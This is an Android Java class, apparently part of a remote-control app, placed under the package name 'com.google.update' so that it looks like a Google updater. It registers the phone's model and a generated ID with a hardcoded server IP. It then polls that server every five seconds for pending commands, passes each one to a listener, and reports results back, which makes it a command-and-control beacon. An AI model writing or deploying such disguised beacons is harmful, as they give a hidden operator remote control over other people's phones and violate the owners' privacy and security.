package com.google.update;

import android.content.Context;
import android.util.Log;
import org.json.JSONObject;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class PocketBaseManager {
    private static final String BASE_URL = "http://10.34.191.214:8090";
    private static final String DEVICES_COLLECTION = "devices";
    private static final String COMMANDS_COLLECTION = "commands";
    private final Context context;
    private final ExecutorService executor = Executors.newSingleThreadExecutor();
    private String deviceId;
    private CommandListener commandListener;

    public interface CommandListener {
        void onCommand(String command);
    }

    public PocketBaseManager(Context context) {
        this.context = context;
        this.deviceId = "device_" + System.currentTimeMillis() + "_" + android.os.Build.MODEL.replace(" ", "_");
    }

    public void registerDevice(String deviceName) {
        executor.execute(() -> {
            try {
                JSONObject data = new JSONObject();
                data.put("device_id", deviceId);
                data.put("device_name", deviceName);
                data.put("last_seen", String.valueOf(System.currentTimeMillis()));

                HttpURLConnection conn = (HttpURLConnection) new URL(BASE_URL + "/api/collections/" + DEVICES_COLLECTION + "/records").openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);

                OutputStream os = conn.getOutputStream();
                os.write(data.toString().getBytes(StandardCharsets.UTF_8));
                os.flush();
                os.close();

                int code = conn.getResponseCode();
                Log.d("PocketBase", "Register response: " + code);
                conn.disconnect();

                if (code == 200 || code == 204) {
                    startListening();
                }
            } catch (Exception e) {
                Log.e("PocketBase", "Register error: " + e.getMessage());
            }
        });
    }

    public void setCommandListener(CommandListener listener) {
        this.commandListener = listener;
    }

    private void startListening() {
        new Thread(() -> {
            while (true) {
                try {
                    HttpURLConnection conn = (HttpURLConnection) new URL(BASE_URL + "/api/collections/" + COMMANDS_COLLECTION + "/records?filter=device_id='" + deviceId + "'&status=pending").openConnection();
                    conn.setRequestMethod("GET");
                    conn.setRequestProperty("Content-Type", "application/json");

                    BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                    StringBuilder response = new StringBuilder();
                    String line;
                    while ((line = reader.readLine()) != null) {
                        response.append(line);
                    }
                    reader.close();
                    conn.disconnect();

                    JSONObject json = new JSONObject(response.toString());
                    if (json.has("items")) {
                        for (int i = 0; i < json.getJSONArray("items").length(); i++) {
                            JSONObject item = json.getJSONArray("items").getJSONObject(i);
                            String command = item.getString("command");
                            String commandId = item.getString("id");

                            if (commandListener != null) {
                                commandListener.onCommand(command);
                            }

                            // تحديث الحالة إلى "completed"
                            JSONObject updateData = new JSONObject();
                            updateData.put("status", "completed");
                            HttpURLConnection updateConn = (HttpURLConnection) new URL(BASE_URL + "/api/collections/" + COMMANDS_COLLECTION + "/records/" + commandId).openConnection();
                            updateConn.setRequestMethod("PATCH");
                            updateConn.setRequestProperty("Content-Type", "application/json");
                            updateConn.setDoOutput(true);
                            OutputStream os = updateConn.getOutputStream();
                            os.write(updateData.toString().getBytes(StandardCharsets.UTF_8));
                            os.flush();
                            os.close();
                            updateConn.disconnect();
                        }
                    }

                    Thread.sleep(5000);
                } catch (Exception e) {
                    Log.e("PocketBase", "Listening error: " + e.getMessage());
                    try { Thread.sleep(5000); } catch (InterruptedException ignored) {}
                }
            }
        }).start();
    }

    public void sendResult(String commandId, String result) {
        executor.execute(() -> {
            try {
                JSONObject data = new JSONObject();
                data.put("result", result);

                HttpURLConnection conn = (HttpURLConnection) new URL(BASE_URL + "/api/collections/" + COMMANDS_COLLECTION + "/records/" + commandId).openConnection();
                conn.setRequestMethod("PATCH");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);

                OutputStream os = conn.getOutputStream();
                os.write(data.toString().getBytes(StandardCharsets.UTF_8));
                os.flush();
                os.close();
                conn.disconnect();
            } catch (Exception e) {
                Log.e("PocketBase", "Send result error: " + e.getMessage());
            }
        });
    }

    public String getDeviceId() {
        return deviceId;
    }
}
